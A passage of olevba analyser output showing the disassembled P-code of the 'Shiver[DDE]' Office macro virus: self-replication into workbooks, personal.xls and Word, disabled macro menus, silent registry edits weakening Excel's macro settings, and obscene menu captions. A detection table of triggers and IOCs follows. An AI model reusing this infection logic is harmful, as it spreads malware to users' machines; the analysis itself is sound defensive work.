' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #171:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' Line #174:
' 	FuncDefn (Sub Auto_Open())
' Line #175:
' 	LitStr 0x000A "ShiverTime"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #176:
' 	EndSub 
' Line #177:
' Line #178:
' 	FuncDefn (Sub ShiverTime())
' Line #179:
' Line #180:
' 	ArgsCall Read 0x0000 
' Line #181:
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' Line #184:
' 	ArgsCall (Call) xlTrigger 0x0000 
' Line #185:
' Line #186:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 "BOOK"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	BoS 0x0000 
' 	EndIf 
' Line #187:
' Line #188:
' 	LitStr 0x000D "c:\shiver.sys"
' 	LitStr 0x0007 "Module1"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #189:
' Line #190:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #191:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #192:
' Line #193:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #194:
' Line #195:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #196:
' 	Ld i 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "Module1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St SXLS 
' 	EndIf 
' Line #197:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #198:
' Line #199:
' 	Ld SXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #200:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #201:
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' Line #202:
' 	EndIfBlock 
' Line #203:
' Line #204:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #205:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\personal.xls"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #206:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Paren 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #207:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #208:
' 	LitStr 0x000C "personal.xls"
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #209:
' 	EndIfBlock 
' Line #210:
' Line #211:
' 	Label out 
' Line #212:
' Line #213:
' 	LitStr 0x0009 "c:\o6.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.REG"
' 	Ne 
' 	LitStr 0x0009 "c:\o6.bat"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0006 "O6.BAT"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #214:
' Line #215:
' 	LitStr 0x0009 "c:\o6.reg"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #220:
' Line #221:
' 	LitStr 0x0009 "c:\o6.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "regedit /s c:\o6.reg"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #224:
' 	EndIfBlock 
' Line #225:
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
' 	FuncDefn (Sub wdTrigger())
' Line #229:
' 	OnError (Resume Next) 
' Line #230:
' 	ArgsCall Read 0x0000 
' Line #231:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #232:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #233:
' 	Ld Rnd 
' 	LitDI2 0x004B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x003C 
' 	Eq 
' 	IfBlock 
' Line #234:
' 	LitStr 0x0016 "Shiver[DDE] by ALT-F11"
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #235:
' 	LitStr 0x0015 "Cum Stained Sheets..."
' 	LitStr 0x000B "Versions..."
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #236:
' 	LitStr 0x0019 "Hey Man I Did Your Mom..."
' 	LitStr 0x0010 "Paste Special..."
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #237:
' 	LitStr 0x0014 "Wanna do some MDMA ?"
' 	LitStr 0x0008 "Break..."
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #238:
' 	LitStr 0x0015 "Peace, Love and Drugs"
' 	LitStr 0x0014 "About Microsoft Word"
' 	LitStr 0x0004 "Help"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #239:
' 	LitStr 0x001F "I'll die happy, you'll just die"
' 	LitStr 0x000A "Properties"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #240:
' 	LitStr 0x0010 "Heywood Jablowmi"
' 	LitStr 0x0008 "Go To..."
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #241:
' 	LitStr 0x000A "Body Count"
' 	LitStr 0x000D "Word Count..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #242:
' 	LitStr 0x0004 "Cunt"
' 	LitStr 0x0007 "Font..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #243:
' 	LitStr 0x000A "No Clothes"
' 	LitStr 0x0005 "Close"
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #244:
' 	LitStr 0x0007 "Blow Me"
' 	LitStr 0x0005 "Split"
' 	LitStr 0x0006 "Window"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #245:
' 	LitStr 0x000F "Crusty Porn GIF"
' 	LitStr 0x0007 "Picture"
' 	LitStr 0x0006 "Insert"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #246:
' 	LitStr 0x000D "My Balls Itch"
' 	LitStr 0x0008 "Print..."
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #247:
' 	LitStr 0x0011 "Pills And Needles"
' 	LitStr 0x0018 "Bullets and Numbering..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #248:
' 	LitStr 0x0010 "Insert and Probe"
' 	LitStr 0x000F "Insert Table..."
' 	LitStr 0x0005 "Table"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #249:
' 	LitStr 0x000B "Sodomize..."
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #250:
' 	LitStr 0x001C "Spelling and Your Grandma..."
' 	LitStr 0x0017 "Spelling and Grammar..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #251:
' 	LitStr 0x0007 "Gaybars"
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #252:
' 	LitStr 0x000C "Masturbation"
' 	LitStr 0x000F "Master Document"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #253:
' 	Ld Rnd 
' 	LitDI2 0x0190 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x00BC 
' 	Eq 
' 	ElseIfBlock 
' Line #254:
' 	LitStr 0x000D "c:\sister.dll"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #255:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Hey Man, I Kinda Like Your Sister"
' 	PrintItemNL 
' Line #256:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Hey Man, I Hope That's Cool"
' 	PrintItemNL 
' Line #257:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Hey Man, I Kinda Lose My Mind"
' 	PrintItemNL 
' Line #258:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Every Single Time I Find Your Sister"
' 	PrintItemNL 
' Line #259:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "Suntanned By The Pool"
' 	PrintItemNL 
' Line #260:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Hey Man, I Wanna See Her Naked"
' 	PrintItemNL 
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Hey Man, I'm Always In Her Room"
' 	PrintItemNL 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "All Alone When No One's There"
' 	PrintItemNL 
' Line #263:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Going Through Her Underwear"
' 	PrintItemNL 
' Line #264:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Hey Man, I Gotta See Her Soon"
' 	PrintItemNL 
' Line #265:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Hey Man, I'll Never Get Her Pregnant"
' 	PrintItemNL 
' Line #266:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "But Hey Man, How Can I Resist Her"
' 	PrintItemNL 
' Line #267:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "The Day I Give Her A Wedding Band"
' 	PrintItemNL 
' Line #268:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "Are You Going To Be My Best Man?"
' 	PrintItemNL 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Hey Man, I Kinda Like Your Sister"
' 	PrintItemNL 
' Line #270:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "I Kinda Like Your Sister"
' 	PrintItemNL 
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "I Kinda Like Your Sister"
' 	PrintItemNL 
' Line #272:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "I Kinda Like Her"
' 	PrintItemNL 
' Line #273:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #274:
' 	LitStr 0x0013 "write c:\sister.dll"
' 	Ld vbMaximizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #275:
' 	EndIfBlock 
' Line #276:
' 	EndSub 
' Line #277:
' Line #278:
' 	FuncDefn (Sub xlTrigger())
' Line #279:
' 	OnError (Resume Next) 
' Line #280:
' 	ArgsCall Read 0x0000 
' Line #281:
' 	Ld xlDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #282:
' 	Ld Rnd 
' 	LitDI2 0x0320 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0259 
' 	Eq 
' 	IfBlock 
' Line #283:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #284:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x000C 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Ld x 
' 	Concat 
' 	St RR 
' Line #285:
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall AddComment 0x0000 
' Line #286:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemSt Visible 
' Line #287:
' 	LitStr 0x0016 "Shiver[DDE] by ALT-F11"
' 	ParamNamed Then 
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	ArgsMemCall Then 0x0001 
' Line #288:
' 	LitVarSpecial (True)
' 	Ld RR 
' 	ArgsLd Range 0x0001 
' 	MemLd Comment 
' 	MemLd Shape 
' 	ArgsMemCall Set 0x0001 
' Line #289:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementLeft 0x0001 
' Line #290:
' 	Ld Rnd 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	ArgsMemCall IncrementTop 0x0001 
' Line #291:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #292:
' 	EndIfBlock 
' Line #293:
' 	EndSub 
' Line #294:
' Line #295:
' Line #296:
' 	FuncDefn (Sub Auto_Close())
' Line #297:
' Line #298:
' 	OnError out 
' Line #299:
' Line #300:
' 	ArgsCall (Call) CheckMarker 0x0000 
' Line #301:
' Line #302:
' 	LitStr 0x0007 "OpusApp"
' 	ArgsLd FindApp 0x0001 
' 	St hWnd 
' Line #303:
' Line #304:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St WordFound 
' 	EndIf 
' Line #305:
' Line #306:
' 	Ld WordFound 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Marker 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #307:
' Line #308:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x000C "\winword.exe"
' 	Concat 
' 	Ld vbMinimizedFocus 
' 	ArgsCall Shell 0x0002 
' Line #309:
' 	LitStr 0x0006 "MSWord"
' 	LitStr 0x0006 "system"
' 	Ld Application 
' 	ArgsMemLd DDEInitiate 0x0002 
' 	St CNL 
' Line #310:
' 	Ld CNL 
' 	LitStr 0x000B "[fileclose]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #311:
' 	Ld CNL 
' 	LitStr 0x0013 "[Sendkeys "%{F11}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #312:
' 	Ld CNL 
' 	LitStr 0x000F "[Sendkeys "^m"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #313:
' 	ArgsCall (Call) delay 0x0000 
' Line #314:
' 	LitStr 0x000D "c:\shiver.sys"
' 	Ld Wait 
' 	ArgsCall SendKeys 0x0002 
' Line #315:
' 	LitStr 0x0002 "%o"
' 	ArgsCall SendKeys 0x0001 
' Line #316:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #317:
' 	Ld CNL 
' 	LitStr 0x0012 "[Sendkeys "%{F4}"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #318:
' 	Ld CNL 
' 	LitStr 0x000E "[Sendkeys "y"]"
' 	Ld Application 
' 	ArgsMemCall DDEExecute 0x0002 
' Line #319:
' 	Ld CNL 
' 	Ld Application 
' 	ArgsMemCall DDETerminate 0x0001 
' Line #320:
' Line #321:
' 	ArgsCall (Call) MakeMarker 0x0000 
' Line #322:
' Line #323:
' 	LitVarSpecial (True)
' 	St JustRun 
' Line #324:
' Line #325:
' 	EndIfBlock 
' Line #326:
' Line #327:
' 	Label out 
' Line #328:
' Line #329:
' 	OnError (Resume Next) 
' Line #330:
' 	LitStr 0x0009 "c:\o6.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #331:
' Line #332:
' 	Ld Rnd 
' 	LitDI2 0x001E 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0005 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) xlReEvalInfection 0x0000 
' 	EndIf 
' Line #333:
' Line #334:
' 	EndSub 
' Line #335:
' Line #336:
' 	FuncDefn (Sub delay())
' Line #337:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Hour 0x0001 
' 	St newHour 
' Line #338:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	St newMinute 
' Line #339:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Second 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	St newSecond 
' Line #340:
' 	Ld newHour 
' 	Ld newMinute 
' 	Ld newSecond 
' 	ArgsLd TimeSerial 0x0003 
' 	St waitTime 
' Line #341:
' 	Ld waitTime 
' 	Ld Application 
' 	ArgsMemCall Wait 0x0001 
' Line #342:
' 	EndSub 
' Line #343:
' Line #344:
' 	FuncDefn (Sub wdReEvalInfection())
' Line #345:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0015 "\xlstart\personal.xls"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000C "PERSONAL.XLS"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #346:
' 	LitStr 0x0006 "NoNoNo"
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #347:
' 	EndIfBlock 
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' 	FuncDefn (Sub xlReEvalInfection())
' Line #351:
' 	Ld Application 
' 	MemLd Path 
' 	LitStr 0x0012 "\startup\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	Ld Marker 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	Ld JustRun 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #352:
' 	LitStr 0x0006 "Office"
' 	LitStr 0x0003 "8.0"
' 	LitStr 0x000B "Shiver[DDE]"
' 	LitStr 0x0006 "NoNoNo"
' 	ArgsCall SaveSetting 0x0004 
' Line #353:
' 	EndIfBlock 
' Line #354:
' 	EndSub 
' Line #355:
' Line #356:
' 	FuncDefn (Sub DDE_Info())
' Line #357:
' Line #358:
' 	QuoteRem 0x0000 0x002D " Shiver[DDE] by ALT-F11 with help from ALT-F4"
' Line #359:
' 	QuoteRem 0x0000 0x0046 " This is the first virus produced by The Alternative Virus Mafia (AVM)"
' Line #360:
' 	QuoteRem 0x0000 0x0026 "       ALT-F4 - "I was born for dying""
' Line #361:
' 	QuoteRem 0x0000 0x002B "       ALT-F11 - "Actions without thoughts""
' Line #362:
' Line #363:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMaximizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |sister.dll          |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

